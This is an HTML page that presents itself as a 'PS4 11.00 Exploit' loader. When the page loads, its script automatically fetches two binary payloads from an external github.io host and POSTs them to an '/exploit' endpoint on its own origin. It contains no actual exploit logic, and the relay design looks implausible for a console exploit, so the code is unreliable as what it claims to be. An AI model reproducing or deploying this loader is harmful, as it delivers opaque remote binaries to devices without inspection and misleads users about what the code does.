<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 11.00 Exploit</title>
    <script>
        async function runExploit() {
            try {
                document.getElementById('status').innerText = 'Starting exploit...';

                const primaryPayload = await fetchPayload('https://alihussien96.github.io/payload.bin');
                const stage2Payload = await fetchPayload('https://alihussien96.github.io/stage2_11.00.bin');

                const exploitEndpoint = `${window.location.origin}/exploit`;

                await sendPayload(exploitEndpoint, primaryPayload);
                console.log('Primary payload sent successfully');

                await sendPayload(exploitEndpoint, stage2Payload);
                console.log('Stage 2 payload sent successfully');

                document.getElementById('status').innerText = 'Payloads sent successfully. Check your PS4.';
            } catch (error) {
                console.error('Error running exploit:', error);
                document.getElementById('status').innerText = `Error: ${error.message}`;
            }
        }

        async function fetchPayload(url) {
            const response = await fetch(url);
            if (!response.ok) {
                throw new Error(`Failed to fetch ${url}: ${response.statusText}`);
            }
            return new Uint8Array(await response.arrayBuffer());
        }

        async function sendPayload(url, payload) {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/octet-stream',
                },
                body: payload
            });
            if (!response.ok) {
                throw new Error(`Failed to send payload to ${url}: ${response.statusText}`);
            }
        }

        document.addEventListener('DOMContentLoaded', runExploit);
    </script>
</head>
<body>
    <h1>PS4 11.00 Exploit</h1>
    <p id="status">Status: Idle</p>
</body>
</html>
